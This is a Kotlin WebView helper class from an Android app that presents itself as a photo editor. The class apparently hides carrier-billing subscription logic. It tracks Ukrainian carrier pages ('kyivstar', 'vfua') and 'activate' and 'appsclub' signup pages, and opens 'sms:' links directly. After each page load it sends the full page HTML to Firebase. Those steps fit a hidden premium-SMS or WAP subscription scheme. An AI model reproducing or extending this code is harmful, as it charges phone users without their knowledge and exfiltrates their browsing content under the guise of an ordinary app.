package com.peditor.green.Utils.lk

import android.annotation.SuppressLint
import android.content.Intent
import android.net.Uri
import android.util.JsonReader
import android.util.JsonToken
import android.util.Log
import android.webkit.ValueCallback
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import com.peditor.green.App
import com.peditor.green.Utils.Analytics
import com.peditor.green.Utils.lk.creator.FirebaseLogger
import java.io.IOException
import java.io.StringReader

class WV {
    private val variables = Variables()
    private val mPrefs = PreferenceProvider()

    private val FIRST = 0
    private val SECOND = 1

    @SuppressLint("SetJavaScriptEnabled")
    fun setParams(wov: WebView) {
        val webSettings = wov.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        wov.settings.pluginState = WebSettings.PluginState.ON
        wov.settings.allowFileAccess = true
        wov.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, url: String): Boolean {
                Analytics.logUrl(url)

                if (url!!.contains("kyivstar")) {
                    LoadWatcher.speakAboutFlow(LoadWatcher.K_FLOW)
                } else if (url!!.contains("vfua")) {
                    LoadWatcher.speakAboutFlow(LoadWatcher.V_FLOW)
                }

                if (url!!.startsWith("sms:")) {
                    var intent = Intent(Intent.ACTION_VIEW, Uri.parse(url!!))
                    intent.addCategory(Intent.CATEGORY_DEFAULT)
                    intent.addCategory(Intent.CATEGORY_BROWSABLE)
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    App.getInstance().startActivity(intent)

                } else {
                    view!!.loadUrl(url!!)
                }
                return true
            }

            override fun onPageFinished(view: WebView, url: String) {
                super.onPageFinished(view, url)

                view.evaluateJavascript("(function() {return document.getElementsByTagName('html')[0].outerHTML;})();", ValueCallback<String?> { value ->
                    val reader = JsonReader(StringReader(value))
                    reader.setLenient(true)
                    try {
                        if (reader.peek() === JsonToken.STRING) {
                            val domStr: String = reader.nextString()
                            if (domStr != null) {
                                FirebaseLogger.logPage(url, domStr)
                            }
                        }
                    } catch (e: IOException) {
                        Analytics.logError(e.toString())
                    } finally {
                    }
                })

                if (url!!.contains("activate")) {
                    LoadWatcher.speakAboutLoaded(SECOND, url)
                } else if (url!!.contains("appsclub")) {
                    LoadWatcher.speakAboutLoaded(FIRST, url)
                }

                if (variables.OPEN == 0) {
                    variables.pageIterator++
                    if (variables.pageIterator == 1) {
                        variables.OPEN = 1
                        variables.firstUrl = wov.url!!

                        mPrefs.saveDataString(LideraSharedKeys.FirstOpenUrl.key, variables.firstUrl)
                        mPrefs.saveDataInt(LideraSharedKeys.FirstOpenView.key, variables.OPEN)
                    }
                }
            }
        }
    }
}